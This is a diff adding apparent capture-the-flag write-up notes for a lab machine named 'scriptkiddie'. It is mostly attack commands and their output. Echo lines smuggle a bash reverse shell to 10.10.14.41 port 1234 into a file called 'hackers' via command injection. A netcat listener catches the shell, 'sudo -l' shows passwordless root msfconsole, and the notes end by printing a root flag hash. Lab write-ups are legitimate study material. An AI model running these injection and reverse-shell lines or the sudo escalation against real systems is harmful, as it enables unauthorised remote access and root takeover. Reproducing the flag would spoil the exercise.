@@ -1,14 +1,82 @@
 
+leaving 3 spaces at the front
+
+
+echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.41/1234 0>&1' #" >> hackers
 
 
 
+leaving 2 spaces at the front
+
+echo "ignore  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.41/1234 0>&1' #" >> hackers 
 
 
 
+run those commands after running a listener
+```
+hippoeug@kali:~$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.129.95.150] 41366
+bash: cannot set terminal process group (832): Inappropriate ioctl for device
+bash: no job control in this shell
+pwn@scriptkiddie:~$ 
+
+```
 
 
 
+pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+
+
+as learnt in blocky we should use sudo -l
+
+
+
+pwn@scriptkiddie:~$ sudo msfconsole
+...
+msf6 > pwd
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: pwd
+
+/home/pwn
+
+msf6 > whoami
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: whoami
+
+root
+
+msf6 > pwd
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: pwd
+
+/root
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+msf6 > ls
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: ls
+
+root.txt
+snap
+
+
+
+msf6 > cat root.txt
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: cat root.txt
+
+be03af4e25fa631012bf791a53a47195
 
 
 
